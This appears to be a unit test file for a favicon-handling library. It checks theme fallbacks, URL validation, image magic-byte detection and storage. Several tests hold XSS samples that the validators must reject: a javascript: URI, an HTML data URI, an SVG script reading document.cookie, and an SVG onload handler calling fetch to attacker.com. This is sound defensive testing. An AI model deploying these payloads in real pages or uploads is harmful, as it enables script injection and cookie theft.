/**
 * Standalone Verification & Unit Test Suite for @novexel/favicon
 */
const assert = require('assert')

// Resolve compiled dist files
const {
  FaviconController,
  validateFaviconConfig,
  safeValidateFaviconConfig,
  validateFaviconBuffer,
  InMemoryFaviconStorageAdapter,
} = require('../dist/index.js')

async function runTests() {
  console.log('====================================================')
  console.log('Running @novexel/favicon Enterprise Test Suite')
  console.log('====================================================\n')

  let passed = 0
  let failed = 0

  async function test(name, fn) {
    try {
      await fn()
      console.log(`  ✓ ${name}`)
      passed++
    } catch (err) {
      console.error(`  ✗ ${name}`)
      console.error(`    ${err.stack || err.message}`)
      failed++
    }
  }

  // 1. Controller & Fallback Hierarchy
  await test('1. FaviconController: resolves global favicon when no theme override', () => {
    const controller = new FaviconController({
      faviconUrl: 'https://cdn.example.com/global.ico',
    })
    assert.strictEqual(controller.resolveFaviconUrl('light'), 'https://cdn.example.com/global.ico')
    assert.strictEqual(controller.resolveFaviconUrl('dark'), 'https://cdn.example.com/global.ico')
  })

  await test('2. FaviconController: resolves theme-specific favicon overrides', () => {
    const controller = new FaviconController({
      faviconUrl: '/favicons/global.ico',
      faviconUrlLight: '/favicons/light.png',
      faviconUrlDark: '/favicons/dark.png',
    })
    assert.strictEqual(controller.resolveFaviconUrl('light'), '/favicons/light.png')
    assert.strictEqual(controller.resolveFaviconUrl('dark'), '/favicons/dark.png')
  })

  await test('3. FaviconController: falls back to logo when favicon is missing', () => {
    const controller = new FaviconController({
      logoUrlLight: '/branding/logo-light.svg',
      logoUrlDark: '/branding/logo-dark.svg',
    })
    assert.strictEqual(controller.resolveFaviconUrl('light'), '/branding/logo-light.svg')
    assert.strictEqual(controller.resolveFaviconUrl('dark'), '/branding/logo-dark.svg')
  })

  await test('4. FaviconController: uses default fallback when config is completely empty', () => {
    const controller = new FaviconController({})
    assert.strictEqual(controller.resolveFaviconUrl('light'), '/favicon.ico')
    assert.strictEqual(controller.resolveFaviconUrl('dark'), '/favicon.ico')
  })

  // 2. Schema Validation & Injection Prevention
  await test('5. Schema: validates clean relative and absolute HTTPS URLs', () => {
    const valid = validateFaviconConfig({
      faviconUrl: 'https://assets.company.com/fav.ico',
      faviconUrlLight: '/media/fav-light.png',
      faviconUrlDark: 'data:image/png;base64,iVBORw0KGgo=',
    })
    assert.strictEqual(valid.faviconUrl, 'https://assets.company.com/fav.ico')
    assert.strictEqual(valid.faviconUrlLight, '/media/fav-light.png')
  })

  await test('6. Schema: rejects javascript: URI scheme attacks', () => {
    const result = safeValidateFaviconConfig({
      faviconUrl: 'javascript:alert(1)',
    })
    assert.strictEqual(result.success, false, 'javascript: URI should fail schema validation')
  })

  await test('7. Schema: rejects data:text/html XSS vectors', () => {
    const result = safeValidateFaviconConfig({
      faviconUrl: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    })
    assert.strictEqual(result.success, false, 'HTML data URI should fail schema validation')
  })

  // 3. Binary Magic-Byte File Validation
  await test('8. validateFaviconBuffer: recognizes authentic PNG magic bytes', () => {
    const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00])
    const res = validateFaviconBuffer(pngBuffer)
    assert.strictEqual(res.valid, true)
    assert.strictEqual(res.format, 'png')
    assert.strictEqual(res.mime, 'image/png')
  })

  await test('9. validateFaviconBuffer: recognizes authentic ICO magic bytes', () => {
    const icoBuffer = Buffer.from([0x00, 0x00, 0x01, 0x00, 0x01, 0x00])
    const res = validateFaviconBuffer(icoBuffer)
    assert.strictEqual(res.valid, true)
    assert.strictEqual(res.format, 'ico')
    assert.strictEqual(res.mime, 'image/x-icon')
  })

  await test('10. validateFaviconBuffer: recognizes clean SVG icons', () => {
    const svgBuffer = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="teal"/></svg>')
    const res = validateFaviconBuffer(svgBuffer)
    assert.strictEqual(res.valid, true)
    assert.strictEqual(res.format, 'svg')
    assert.strictEqual(res.sanitized, true)
  })

  await test('11. validateFaviconBuffer: rejects malicious SVG containing <script> tag', () => {
    const maliciousSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>')
    const res = validateFaviconBuffer(maliciousSvg)
    assert.strictEqual(res.valid, false)
    assert.ok(res.error.includes('Malicious or active script content'))
  })

  await test('12. validateFaviconBuffer: rejects malicious SVG containing onload handler', () => {
    const maliciousSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'http://attacker.com\')"><rect width="10" height="10"/></svg>')
    const res = validateFaviconBuffer(maliciousSvg)
    assert.strictEqual(res.valid, false)
    assert.ok(res.error.includes('Malicious or active script content'))
  })

  await test('13. validateFaviconBuffer: rejects polyglot/corrupt non-image files', () => {
    const exeBuffer = Buffer.from('MZ\x90\x00\x03\x00\x00\x00')
    const res = validateFaviconBuffer(exeBuffer)
    assert.strictEqual(res.valid, false)
  })

  // 4. Storage Adapter Inversion
  await test('14. InMemoryFaviconStorageAdapter: saves valid favicon and returns isolated key', async () => {
    const adapter = new InMemoryFaviconStorageAdapter()
    const pngBuffer = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00])
    const url = await adapter.save(pngBuffer, { tenantId: 'tenant-100', theme: 'dark' })
    assert.ok(url.includes('/media/favicons/tenant-100/dark-'))
    const retrieved = await adapter.get(url)
    assert.deepStrictEqual(retrieved, pngBuffer)
  })

  await test('15. InMemoryFaviconStorageAdapter: rejects saving unverified spoofed files', async () => {
    const adapter = new InMemoryFaviconStorageAdapter()
    const corruptBuffer = Buffer.from('NOT AN IMAGE')
    let threw = false
    try {
      await adapter.save(corruptBuffer)
    } catch (err) {
      threw = true
    }
    assert.ok(threw, 'Should refuse to persist invalid file')
  })

  console.log(`\n====================================================`)
  console.log(`Test Results: ${passed} passed, ${failed} failed.`)
  console.log(`====================================================\n`)

  if (failed > 0) {
    process.exit(1)
  }
}

runTests()
